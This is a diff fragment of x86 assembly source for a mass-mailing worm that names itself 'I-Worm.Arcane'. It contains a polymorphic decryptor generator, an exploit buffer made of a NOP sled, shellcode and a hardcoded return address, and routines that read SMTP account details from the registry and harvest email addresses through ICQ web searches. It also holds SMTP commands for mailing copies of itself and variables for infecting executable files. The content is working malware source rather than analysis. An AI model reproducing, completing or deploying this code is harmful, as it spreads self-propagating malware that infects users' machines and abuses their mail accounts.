+lea     eax, [ebp+user32_dll]                       ; ptr "",0
+push    eax
+call_   arcane_LoadLibraryA                          ; Get address! 
+
+mov     ebx,eax                                     ; EAX = EBX = DLL address
+lea     esi,[ebp+first_user32api]                   ; ptr first winsock api
+dec     esi                    
+lea     edi,[ebp+arcane_user32api_store]             ; where to store address
+call    get_apis_from_dll                           ; GET 'EM!
+
+lea     eax, [ebp+advapi32_dll]                          ; ptr "",0
+push    eax                                     
+call_   arcane_LoadLibraryA                          ; Get address! 
+
+mov     ebx,eax                                     ; EAX = EBX = DLL address
+lea     esi,[ebp+first_advapi32api]                 ; ptr first winsock api
+dec     esi                    
+lea     edi,[ebp+arcane_advapi32api_store]           ; where to store address
+call    get_apis_from_dll                           ; GET 'EM!
+
+ret
+
+api_failure:
+xor     eax,eax
+dec     eax
+ret
+
+
+
+delta_offset:
+call    get_delta                        ; put return address on stack
+get_delta:                               ; return address
+pop     ebp                              ; put return address in EBP
+mov     eax,ebp                          ; Save return address (get_delta)
+sub     ebp,offset get_delta             ; substract the "compiled" offset
+ret                                      ; EBP now contains delta offset!
+
+generate_decryptor:
+
+;int     3h
+
+xor     edx,edx
+mov     eax,arcane_total_size
+add     eax,1d
+push    eax
+push    edx
+call_   arcane_GlobalAllocA 
+mov     dword ptr [ebp+arcane_cryptmem],eax 
+call    find_enc_keys
+test    eax,eax
+je      all_keys_bad
+
+;int     3h
+
+mov     byte ptr [ebp+xor_val],al
+mov     byte ptr [ebp+add_val],bl
+
+all_keys_bad:
+
+ret
+
+
+find_enc_keys:
+xor     eax,eax
+restart_search:
+lea     esi,[ebp+arcane_project]
+mov     edi,dword ptr [ebp+arcane_cryptmem]
+mov     ecx,arcane_total_size
+cld
+rep     movsb
+
+mov     edi,dword ptr [ebp+arcane_cryptmem]
+mov     ecx,arcane_total_size
+find_key:
+inc     eax
+enc_body:
+xor     byte ptr [edi], al
+inc     edi
+loop    enc_body
+
+mov     edi,dword ptr [ebp+arcane_cryptmem]
+mov     ecx,arcane_total_size
+
+check_if_valid_enc:
+cmp     al,255d
+jae     no_more_byte_key
+loop_the_enc_body:
+cmp     byte ptr [edi],0
+je      found_invalid_byte
+cmp     byte ptr [edi],0ah
+je      found_invalid_byte
+cmp     byte ptr [edi],0dh
+je      found_invalid_byte
+inc     edi
+loop    loop_the_enc_body
+jmp     found_enc_key
+
+found_invalid_byte:
+call    test_adds
+test    ebx,ebx
+je      restart_search
+
+found_enc_key:
+ret
+
+no_more_byte_key:
+xor     eax,eax
+ret
+
+
+test_adds:
+xor     ebx,ebx
+
+find_add:
+mov     edi,dword ptr [ebp+arcane_cryptmem]
+mov     ecx,arcane_total_size
+inc     ebx
+add_body:
+add     byte ptr [edi], bl
+inc     edi
+loop    add_body
+
+mov     edi,dword ptr [ebp+arcane_cryptmem]
+mov     ecx,arcane_total_size
+
+check_if_valid_add:
+cmp     bl,255d
+jae     no_more_add_byte
+loop_the_add_body:
+cmp     byte ptr [edi],0
+je      found_invalid_add
+cmp     byte ptr [edi],0ah
+je      found_invalid_add
+cmp     byte ptr [edi],0dh
+je      found_invalid_add
+inc     edi
+loop    loop_the_add_body
+jmp     found_add_key
+
+found_invalid_add:
+
+mov     edi,dword ptr [ebp+arcane_cryptmem]
+mov     ecx,arcane_total_size
+sub_body:
+sub     byte ptr [edi], bl
+inc     edi
+loop    sub_body
+jmp     find_add
+
+
+
+found_add_key:
+ret
+
+no_more_add_byte:
+xor     ebx,ebx
+ret
+
+;db "decryptor_start",0
+
+decryptor_start:
+
+xor     eax,eax
+xor     ecx,ecx
+jmp     get_loc
+got_loc:
+pop     esi
+
+mov     cx,arcane_total_size
+xor_it:
+sub     byte ptr [esi],0h
+add_val equ $-1
+xor     byte ptr [esi],0h
+xor_val equ $-1
+inc     esi
+loop    xor_it
+
+jmp     encrypted_start
+
+get_loc:
+call    got_loc
+encrypted_start:
+
+decryptor_end:
+
+;db "decryptor ends here",0
+
+decryptor_len   equ $-offset decryptor_start
+
+
+data:
+
+arcane_cryptmem    dd 0
+
+arcane_msg_caption db "[I-Worm.Arcane by Asmodeus iKX]",0
+arcane_msg_info    db "Arcane lifeforce mysteria",0
+                   db "Version : 1.0",0
+
+date_buffer      db "Date: ", 150d dup(0)
+
+date_format      db "Fri,13 Jun 2000",0
+;date_format      db "ddd,dd MMM yyyy",0
+time_format      db "HH:mm:ss",0
+
+
+
+bomb_bytes       db " +11111111111111111111111111111111111111111111111111111111"
+ret_address      dd 0115cdbbh
+ db 0c7h, 094h, 0fbh, 0bfh, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 0cch, 033h, 0c0h, 033h
+ db 0c9h, 0b0h, 099h, 0ebh, 00dh, 00ah, 05eh, 0b1h, 057h, 030h, 006h, 046h
+ db 0e2h, 0fbh, 0ebh, 005h, 0e8h, 0f1h, 0ffh, 0ffh, 0ffh, 009h, 009h, 009h
+ db 009h, 071h, 099h, 099h, 099h, 099h, 0c4h, 018h, 074h, 0b8h, 089h, 0d9h
+ db 099h, 0aah, 04bh, 0cbh, 014h, 01ch, 0d2h, 089h, 0d9h, 099h, 0c9h, 014h
+ db 01ch, 0c4h, 089h, 0d9h, 099h, 0c9h, 0cbh, 021h, 040h, 0a1h, 06fh, 026h
+ db 066h, 049h, 021h, 054h, 037h, 061h, 026h, 0aah, 04bh, 0cbh, 066h, 049h
+ db 0fah, 0f8h, 0e9h, 0edh, 0f0h, 0f6h, 0f7h, 0b9h, 0f6h, 0ffh, 0b9h, 0eeh
+ db 0f0h, 0f7h, 0fdh, 0f6h, 0eeh, 099h, 0f4h, 0fch, 0eah, 0eah, 0f8h, 0feh
+ db 0fch, 0b9h, 0f6h, 0ffh, 0b9h, 0eeh, 0f0h, 0f7h, 0fdh, 0f6h, 0eeh, 099h
+ db 066h, 0bch, 0d5h, 0a9h, 0d9h, 099h, 066h, 0bch, 0cdh, 0a9h, 0d9h, 000h
+ db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
+ db 000h, 000h, 000h, 00dh, 00ah  
+
+
+
+
+english_lcid     dd 00000409h
+
+
+second_wave:
+some_nops        db 100d dup (90h)
+second_wave_len  equ $-second_wave
+
+mime_ctrl        db 10d dup (0)
+
+rkey              dd 0
+regkey_handle     dd 0
+subkey_location_1 db "Software\Microsoft\Internet Account Manager",0
+subkey_location_2 db "Software\Microsoft\Internet Account Manager\Accounts\", 260 dup (0)
+subkey_location_3 db "Software\Microsoft\Windows\CurrentVersion",0
+
+subkey_len        dd 260
+smtp_account_len  dd 100d
+smtp_server       db "SMTP Server",0
+smtp_email        db "SMTP Email Address",0
+default_account   db "Default Mail Account",0
+smtp_name_len     dd 100d
+
+key_type          dd 0
+smtp_server_s     db 100d dup(0)
+smtp_server_static db "mail.gilkon.com.au",0
+smtp_server_static_len = $ - offset smtp_server_static
+
+icq_post:
+db      "POST /scripts/srch.dll HTTP/1.1",13,10
+db      "User-Agent: Mozilla/4.73 (Windows 95; U) Opera 4.02  [en]",13,10
+db      "Host: wwp.icq.com",13,10
+db      "Accept: text/html, image/png, image/jpeg, image/gif, image/x-xbitmap, image/vnd.wap.wbmp;level=0, */*",13,10
+db      "Accept-Language: en",13,10
+db      "Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0",13,10
+db      "Referer: http://www.icq.com/whitepages/search.html",13,10
+db      "Connection: Keep-Alive",13,10
+db      "Content-type: application/x-www-form-urlencoded",13,10
+db      "Content-length: 212",13,10
+db      "",13,10
+db      "FirstName=&LastName=&NickName=&Email=&AgeRange=0-0&Gender=0&Lang="
+icq_lan db 031h,032h
+db      "&City=&State=&Country=0&Occupation=0&Dept=&Company=&PastInfo=0&PastInfoText=&Interest=0&InterestText=&SubInterest=&Group=0&GroupText=&SEND=Search",0
+icq_post_len = $ - offset icq_post
+;12 = english
+;19 = german
+;27 = japanese
+;29 = Korean
+;43 = spanish
+;45 = swedish
+;59 = max
+
+name_table1:
+db "dark",0
+db "evil",0
+db "lost",0
+db "cool",0
+db "kewl",0
+db "fool",0
+db "hack",0
+db "dead",0
+db "head",0
+db "bozz",0
+name_table2:
+db "trooper",0
+db "travler",0
+db "_g00fer",0
+db "_maniac",0
+db "_master",0
+db "_avatar",0
+db "_jesuzz",0
+db "riddler",0
+db "_satan_",0
+db "lucifer",0
+
+smtp_cmd_helo                db "HELO microsoft.com", 2d dup (0)
+smtp_cmd_helo_len            = $ - offset smtp_cmd_helo
+smtp_cmd_mailfrom            db "MAIL FROM: "
+smtp_email_s                 db 100d dup(0)
+smtp_cmd_rcptto              db "RCPT TO: "
+smtp_rcpt_email              db 100d dup (0)  
+smtp_cmd_data                db "DATA", 2d dup (0)
+;smtp_cmd_bodyfrom            db "FROM: "
+;smtp_name_s                  db 100d dup(0)
+;smtp_cmd_bodysubject         db "SUBJECT: Fw: Guess what, you're mine!", 2d dup (0)
+;smtp_cmd_bodyto              db "TO: <removed>", 2d dup (0)
+smtp_cmd_bodydot             db 0dh,0ah,".", 2d dup(0)
+smtp_cmd_bodyquit            db "QUIT", 2d dup(0)
+
+
+email_mem       dd 0
+icq_mem         dd 0
+icq_mem_size    equ 2000000d
+
+wns32_dll       db "WSOCK32.DLL",0
+wninet_dll      db "WININET.DLL",0
+user32_dll      db "USER32.DLL",0
+advapi32_dll    db "ADVAPI32.DLL",0
+
+inet_dword      dd 0
+newfilesize     dd 0
+memory          dd 0
+unchanged_size  dd 0
+filehandle      dd 0
+maphandle       dd 0
+mapaddress      dd 0
+file_attrib     dd 0
+epo_here        dd 0
+store_here      dd 0
+entry_here      dd 0
+poly_here       dd 0
+new_eip         dd 0
+pe_header       dd 0
+where_am_i      dd 0
+
+k32base         dd 0
+pe_base         dd 0
+nr_names_       dd 0
+ordtable_       dd 0
+addtable_       dd 0
+
+mem_align       dd 0
+file_align      dd 0
+
+old_imagebase   dd 00040000h
+old_eip         dd 00001000h
+arcane_mem       dd 0
+rnd32_seed      dd 0
+infect_what     dd 0
+wrap_filecount  dd 0
+wrap_nh     dd 0
+
+getproc_api            db 'GetProcAddress',0
+getproc_api_len        = $ - offset getproc_api
+arcane_GetProcAddress   dd 0
+
+arcane_k32api_list:
+first_k32api          db "ExitProcess",0             ;*DEBUG*
+                      db "LoadLibraryA",0       
+                      db "CloseHandle",0
+                      db "GlobalAlloc",0
+                      db "GlobalFree",0
+                      db "GetTickCount",0
+                      db "Sleep",0
+                      db "lstrcat",0
+                      db "lstrlen",0
+                      db "lstrcpy",0
+                      db "GetDateFormatA",0
+                      db "GetTimeFormatA",0
+last_k32api           db 0ffh
+
+arcane_wns32api_list:
+first_wns32api        db "htons",0
+                      db "connect",0
+                      db "gethostname",0
+                      db "gethostbyname",0                      
+                      db "inet_ntoa",0
+                      db "socket",0
+                      db "WSAStartup",0
+                      db "closesocket",0
+                      db "accept",0
+                      db "listen",0
+                      db "recv",0
+                      db "bind",0
+                      db "send",0
+                      db "select",0
+                      db "WSACleanup",0
+last_wns32api         db 0ffh
+
+arcane_wninetapi_list:
+first_wninetapi       db "InternetGetConnectedState",0
+last_wninetapi        db 0ffh
+
+arcane_user32api_list:
+first_user32api       db "PeekMessageA",0
+                      db "MessageBoxA",0
+last_user32api        db 0ffh
+
+arcane_advapi32api_list:
+first_advapi32api       db "RegQueryValueExA",0
+                        db "RegSetValueExA",0
+                        db "RegCreateKeyA",0
+                        db "RegCloseKey",0
+last_advapi32api        db 0ffh
+
+
+arcane_k32api_store:
+arcane_ExitProcessA         dd 0
+arcane_LoadLibraryA         dd 0                      
+arcane_CloseHandleA         dd 0
+arcane_GlobalAllocA         dd 0
+arcane_GlobalFreeA          dd 0
+arcane_GetTickCountA        dd 0
+arcane_Sleep                dd 0
+arcane_lstrcatA             dd 0
+arcane_lstrlenA             dd 0
+arcane_lstrcpyA             dd 0
+arcane_GetDateFormatA       dd 0
+arcane_GetTimeFormatA       dd 0
+
+
+arcane_wns32api_store:
+arcane_htons                dd 0                      
+arcane_connect              dd 0                      
+arcane_gethostname          dd 0                      
+arcane_gethostbyname        dd 0                      
+arcane_inet_ntoa            dd 0
+arcane_socket               dd 0                      
+arcane_WSAStartup           dd 0                      
+arcane_closesocket          dd 0                      
+arcane_accept               dd 0                      
+arcane_listen               dd 0                      
+arcane_recv                 dd 0                      
+arcane_bind                 dd 0                      
+arcane_send                 dd 0                      
+arcane_select               dd 0                      
+arcane_WSACleanup           dd 0
+
+arcane_wninetapi_store:
+arcane_InternetGetConnectedState     dd 0
+
+arcane_user32api_store:
+arcane_PeekMessageA         dd 0
+arcane_MessageBoxA          dd 0
+
+arcane_advapi32api_store:
+arcane_RegQueryValueExA        dd 0  
+arcane_RegSetValueExA          dd 0
+arcane_RegCreateKeyA           dd 0
+arcane_RegCloseKey             dd 0
+
+
+
+; IRC DATA
+null_byte:
+db      0h
+
+server_name             db "diemen.nl.eu.undernet.org",0
+icq_server_name         db "wwp.icq.com",0
+smtp_server_name        db 32d dup (0)
+
+
+fd_set:
+fd_nr      dd 1
+fd_socket  dd 0
+
+time_to_live            dd 10000000000d
+send_socket             dd 0
+icq_socket              dd 0
+smtp_socket             dd 0
+icqserver_port_s        dw 0
+smtpserver_port_s       dw 0
+icqserver_port          dd 80
+smtpserver_port         dd 25
+
+host_name               db 260d dup (0)
+con_buffer              db 300h dup (0)
+spec_ip                 db 26d dup(?)
+icq_ip                  dd 0
+smtp_ip                 dd 0
+
+include                 wsock32.inc
+
+WSADATA		struct
+mVersion	dw	0
+mHighVersion	dw	0
+szDescription	db	257 dup(0)
+szSystemStatus	db	129 dup(0)
+iMaxSockets	dw	0
+iMaxUpdDg	dw	0
+lpVendorInfo	dd	0
+WSADATA		ends
+
+wsa_data       WSADATA ?
+
+icq_sock_addr_in:
+icq_sin_family    dw AF_INET
+icq_sin_port      db 2 dup(0)
+icq_sin_addr      dd 0
+icq_sin_zero      db 8 dup(0)
+
+smtp_sock_addr_in:
+smtp_sin_family    dw AF_INET
+smtp_sin_port      db 2 dup(0)
+smtp_sin_addr      dd 0
+smtp_sin_zero      db 8 dup(0)
+
+
+current_host    db 260d dup (0)
+
+saddrlen    dw 16
+	    db 16 dup (0)	
+
+
+arcane_mem_end:
+
+
+
+
+end      arcane_project
+
+
+
+
